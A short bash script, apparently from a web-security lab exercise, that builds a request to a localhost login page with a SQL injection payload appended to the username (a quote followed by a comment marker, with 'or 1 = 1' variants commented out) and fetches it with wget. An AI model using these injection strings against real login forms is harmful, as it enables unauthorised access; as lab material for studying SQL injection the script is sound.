#!/bin/bash

address="http://localhost/lab09/login.php?u="
address+=$1
#address+="\" or 1 = 1"
address+="\" -- "
#address+="&p="
#address+="\" or 1 --"
#address+=" "
#wget -O index.html "`  echo $address ` "

wget  -q -O -  "`  echo $address ` " 
echo

#cat index.html
#rm index.html
